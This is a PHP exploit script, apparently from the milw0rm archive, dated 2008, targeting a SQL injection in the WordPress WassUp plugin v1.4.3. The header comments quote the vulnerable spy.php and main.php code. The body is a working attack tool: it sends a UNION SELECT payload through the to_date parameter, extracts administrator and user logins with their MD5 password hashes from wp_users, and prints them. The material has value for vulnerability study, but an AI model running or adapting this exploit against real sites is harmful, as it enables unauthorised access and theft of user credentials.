<?
# WordPress WassUp plugin v 1.4.3 Sql Injection Exploit 
#
# Plugin Homepage-http://www.wpwp.org/
# 	
# Found by:enter_the_dragon
# 
# Tested successfully on v 1.4-1.4.3 
# (lower versions are possibly vulnerable too just check the source and modify the query as needed)

# Vuln code
#
# -In spy.php
#
# if (isset($_GET['to_date'])) $to_date = htmlentities(strip_tags($_GET['to_date']));
#    ...........
# spyview($from_date,$to_date,$rows);	
# 
# -In  main.php
#   
#  	function spyview ($from_date="",$to_date="",$rows="999") { 
#      ...........
#      $qryC = $wpdb->get_results("SELECT id, wassup_id, max(timestamp) as max_timestamp, ip, hostname, searchengine,  
#  urlrequested, agent, referrer, spider, username, comment_author FROM $table_name WHERE timestamp BETWEEN $from_date AND 
#  $to_date GROUP BY id ORDER BY max_timestamp DESC"); 
# 

# Exploit
# 
# $from_date and $to_date GET variables used in an sql query without being properly filtered so we can inject sql code 
# using a query like ./spy.php?to_date=-1 group by id union select 1,2,3,4,5,6,7,8,9,10,11,12 from table
#
# If exploit is successful Wordpress administrator and users logins and md5 hashed passwords are retrieved
#
# 




echo "\n";
echo "------WordPress WassUp plugin v 1.4.3 Sql Injection Exploit-------"."\n";
echo "-------------------coded by : enter_the_dragon--------------------"."\n";
echo "------------------------------------------------------------------"."\n";
if ($argc!=3)
{
echo " Usage:	$argv[0] target_host wp_path \n";
echo " target_host:	Your target ex www.target.com \n";
echo " wp_path:	WordPress path ex /blog/ or / if wordpress is installed in the web servers root folder";	     
echo "\n";
exit;
}


$query=$argv[1];
$query.=$argv[2];
$query.="wp-content/plugins/wassup/spy.php?";
$query.="to_date=-1%20group%20by%20id%20union%20select%20null,null,null,concat(0x7c,user_login,0x7c,user_pass,0x7c),null,null,null,null,null,null,null,null%20%20from%20wp_users";

  
if(function_exists(curl_init))
{
  $ch = curl_init("http://$query");
  curl_setopt($ch, CURLOPT_HEADER,true);
  curl_setopt( $ch, CURLOPT_RETURNTRANSFER,true);
  curl_setopt($ch, CURLOPT_TIMEOUT,10);
  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.0;Windows NT 5.1)");  
  $html=curl_exec($ch);
  $returncode = curl_getinfo($ch,CURLINFO_HTTP_CODE);
  curl_close($ch);
  if ($returncode==404) exit ("Vulnerable script isnt there....Check your path :| \n");
  
  $pattern="/\|(.*)?\|([a-z0-9]{32})\|/";
  if(preg_match_all($pattern,$html,$matches))
    {
     $usernames=$matches[1];
     $userpasses=$matches[2];
     for($i=0;$i<count($usernames);$i++)
	{
	   echo "User Login:$usernames[$i]\n" ;
     	   echo "User Pass :$userpasses[$i]\n\n";	    
	}
     }
    		    
	else 
     {
	exit ("Exploit Failed :( \n");
     }	


}
else
exit("Error:Libcurl isnt installed \n");

?>

# milw0rm.com [2008-01-30]
